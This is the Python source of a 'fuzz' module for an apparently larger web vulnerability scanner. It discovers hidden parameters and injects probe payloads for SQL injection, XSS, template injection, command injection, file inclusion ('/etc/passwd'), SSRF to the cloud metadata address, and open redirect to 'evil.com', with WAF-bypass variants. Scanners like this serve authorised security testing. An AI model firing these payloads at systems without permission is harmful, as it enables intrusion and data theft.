import asyncio
from modules.base import BaseModule
from core.utils import extract_params, random_string
from core.http import get_base_url
from core.bypass import WAFBypass, PayloadMutator

class FuzzModule(BaseModule):
    name = "fuzz"
    description = "Smart Parameter Fuzzer"
    
    common_params = [
        "id", "page", "file", "path", "url", "redirect", "next", "callback",
        "user", "username", "email", "name", "query", "q", "search", "s",
        "data", "input", "output", "cmd", "exec", "command", "action",
        "type", "sort", "order", "filter", "category", "cat", "dir",
        "view", "show", "display", "template", "tpl", "include", "inc",
        "load", "read", "fetch", "get", "download", "upload", "doc",
        "debug", "test", "admin", "config", "setting", "lang", "locale",
        "token", "key", "api", "secret", "auth", "session", "jwt",
        "return", "goto", "continue", "ref", "referrer", "origin",
    ]
    
    fuzz_payloads = {
        "sqli": ["'", '"', "' OR '1'='1", "1' AND '1'='1", "1 OR 1=1", "'; DROP TABLE--"],
        "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
        "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
        "cmdi": [";id", "|id", "`id`", "$(id)", "& whoami"],
        "lfi": ["../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd%00"],
        "ssrf": ["http://127.0.0.1", "http://localhost", "http://169.254.169.254"],
        "idor": ["1", "2", "0", "-1", "999999", "admin"],
        "redirect": ["//evil.com", "https://evil.com", "javascript:alert(1)"],
    }
    
    error_signatures = {
        "sqli": [r"sql", r"syntax", r"mysql", r"postgresql", r"oracle", r"sqlite", r"query"],
        "xss": [r"<script>alert\(1\)</script>", r"onerror=alert"],
        "ssti": [r"49", r"config", r"__class__", r"TemplateError"],
        "cmdi": [r"uid=", r"root:", r"www-data", r"bin/bash"],
        "lfi": [r"root:.*:0:0", r"\[boot loader\]", r"www-data"],
        "ssrf": [r"connection refused", r"couldn't connect", r"ami-id"],
    }
    
    async def scan(self, target):
        self.findings = []
        self.bypass = WAFBypass()
        self.mutator = PayloadMutator()
        
        params = extract_params(target)
        
        if params:
            await self._fuzz_existing_params(target, params)
        
        await self._discover_hidden_params(target)
        
        return self.findings
    
    async def _fuzz_existing_params(self, target, params):
        for param in params:
            for vuln_type, payloads in self.fuzz_payloads.items():
                for payload in payloads[:3]:
                    variants = self.bypass.generate_variants(payload, self.aggressive)
                    
                    for variant in variants[:2]:
                        resp = await self.test_param(target, param, variant)
                        if resp.get("status"):
                            if self._check_vuln(resp["text"], vuln_type, payload):
                                self.add_finding(
                                    "HIGH",
                                    f"Potential {vuln_type.upper()} detected via fuzzing",
                                    url=target,
                                    parameter=param,
                                    evidence=f"Payload: {payload[:50]}"
                                )
                                break
    
    async def _discover_hidden_params(self, target):
        base_url = get_base_url(target)
        
        tasks = []
        for param in self.common_params:
            tasks.append(self._test_hidden_param(base_url, param))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        discovered = [r for r in results if r and not isinstance(r, Exception)]
        
        if discovered:
            self.add_finding(
                "INFO",
                f"Hidden parameters discovered: {', '.join(discovered[:10])}",
                url=target,
                evidence=f"Found {len(discovered)} hidden parameters"
            )
            
            for param in discovered[:5]:
                await self._fuzz_discovered_param(base_url, param)
    
    async def _test_hidden_param(self, base_url, param):
        marker = random_string(8)
        test_url = f"{base_url}?{param}={marker}"
        
        resp = await self.http.get(test_url)
        if resp.get("status"):
            if marker in resp["text"]:
                return param
            
            baseline = await self.http.get(base_url)
            if baseline.get("status"):
                if len(resp["text"]) != len(baseline["text"]):
                    return param
        
        return None
    
    async def _fuzz_discovered_param(self, base_url, param):
        for vuln_type, payloads in self.fuzz_payloads.items():
            payload = payloads[0]
            test_url = f"{base_url}?{param}={payload}"
            
            resp = await self.http.get(test_url)
            if resp.get("status"):
                if self._check_vuln(resp["text"], vuln_type, payload):
                    self.add_finding(
                        "HIGH",
                        f"Hidden param '{param}' vulnerable to {vuln_type.upper()}",
                        url=base_url,
                        parameter=param,
                        evidence=f"Payload: {payload}"
                    )
    
    def _check_vuln(self, text, vuln_type, payload):
        import re
        
        patterns = self.error_signatures.get(vuln_type, [])
        
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        
        if vuln_type == "xss" and payload in text:
            return True
        
        if vuln_type == "ssti":
            if "49" in text and "7*7" in payload:
                return True
        
        return False
    
    def _get_param_base(self, target):
        return get_base_url(target)